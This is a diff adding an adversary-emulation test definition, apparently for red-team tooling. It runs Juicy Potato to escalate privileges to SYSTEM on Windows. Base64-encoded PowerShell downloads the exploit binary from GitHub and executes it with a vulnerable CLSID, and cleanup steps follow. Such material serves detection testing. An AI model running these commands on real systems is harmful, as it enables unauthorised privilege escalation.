@@ -1,0 +1,19 @@
+- id: d4e6f5bb-e6dd-5eea-9fe3-7919d6114a5b
+  name: Soumaia ART Tests - Juicy Potato
+  description: "This Atomic utilizes Juicy Potato to obtain privilege escalation. \nUpon successful execution of this test, a vulnerable CLSID will be used to execute a process with system permissions.\nThis tactic has been previously observed in SnapMC Ransomware, amongst numerous other campaigns. \n[Reference](https://blog.fox-it.com/2021/10/11/snapmc-skips-ransomware-steals-data/) (requires elevation)"
+  tactic: stealth
+  technique:
+    attack_id: T1134.001
+    name: 'Access Token Manipulation: Token Impersonation/Theft'
+  platforms:
+    windows:
+      psh:
+        command: |-
+          powershell -NoProfile -EncodedCommand aQBmACAAKABUAGUAcwB0AC0AUABhAHQAaAAgACIAJABlAG4AdgA6AFQARQBNAFAAXABBAFIAVAAtAEUAeAB0AGUAcgBuAGEAbABQAGEAeQBsAG8AYQBkAHMAXABKAHUAaQBjAHkAUABvAHQAYQB0AG8ALgBlAHgAZQAiACkAIAB7AGUAeABpAHQAIAAwAH0AIABlAGwAcwBlACAAewBlAHgAaQB0ACAAMQB9AAoA
+          if ($LASTEXITCODE -ne 0) {
+              powershell -NoProfile -EncodedCommand TgBlAHcALQBJAHQAZQBtACAALQBUAHkAcABlACAARABpAHIAZQBjAHQAbwByAHkAIAAiACQAZQBuAHYAOgBUAEUATQBQAFwAQQBSAFQALQBFAHgAdABlAHIAbgBhAGwAUABhAHkAbABvAGEAZABzACIAIAAtAEUAcgByAG8AcgBBAGMAdABpAG8AbgAgAEkAZwBuAG8AcgBlACAALQBGAG8AcgBjAGUAIAB8ACAATwB1AHQALQBOAHUAbABsAAoASQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBPAHUAdABGAGkAbABlACAAIgAkAGUAbgB2ADoAVABFAE0AUABcAEEAUgBUAC0ARQB4AHQAZQByAG4AYQBsAFAAYQB5AGwAbwBhAGQAcwBcAEoAdQBpAGMAeQBQAG8AdABhAHQAbwAuAGUAeABlACIAIAAiAGgAdAB0AHAAcwA6AC8ALwBnAGkAdABoAHUAYgAuAGMAbwBtAC8AbwBoAHAAZQAvAGoAdQBpAGMAeQAtAHAAbwB0AGEAdABvAC8AcgBlAGwAZQBhAHMAZQBzAC8AZABvAHcAbgBsAG8AYQBkAC8AdgAwAC4AMQAvAEoAdQBpAGMAeQBQAG8AdABhAHQAbwAuAGUAeABlACIACgA=
+          }
+          cmd /c '$env:TEMP\ART-ExternalPayloads\JuicyPotato.exe' -l '7777' -t * -p '$env:windir\system32\notepad.exe' -c '{F7FD3FD6-9994-452D-8DA7-9A8FD87AEEF4}'
+        cleanup: |-
+          get-ciminstance Win32_Process | where-object { $_.Path -eq "$env:windir\system32\notepad.exe" } | invoke-cimmethod -methodname "terminate" | out-null
+          get-ciminstance Win32_Process | where-object { $_.Path -eq "$env:TEMP\ART-ExternalPayloads\JuicyPotato.exe" } | invoke-cimmethod -methodname "terminate" | out-null
